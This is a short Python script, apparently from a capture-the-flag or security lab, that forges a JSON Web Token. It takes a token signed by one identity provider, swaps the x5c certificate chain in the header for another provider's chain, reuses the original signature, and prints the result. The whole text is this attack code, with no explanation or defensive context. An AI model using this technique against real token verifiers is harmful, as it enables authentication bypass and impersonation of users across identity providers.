import base64, json, subprocess, sys

def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

msg_sign = open('/tmp/msg1.txt','rb').read()   # header.payload signed by paleoid key
sig1 = open('/tmp/sig1.bin','rb').read()
hdr = json.loads(base64.urlsafe_b64decode(msg_sign.split(b'.')[0] + b'=='))
payload = json.loads(base64.urlsafe_b64decode(msg_sign.split(b'.')[1] + b'=='))

new_hdr = dict(hdr)
new_hdr['x5c'] = [open('/tmp/idp2cert.b64').read().strip()]  # strataid cert chain
header_json = json.dumps(new_hdr, separators=(',',':')).encode()
payload_json = json.dumps(payload, separators=(',',':')).encode()
forged = b64u(header_json) + '.' + b64u(payload_json) + '.' + b64u(sig1)
print(forged)
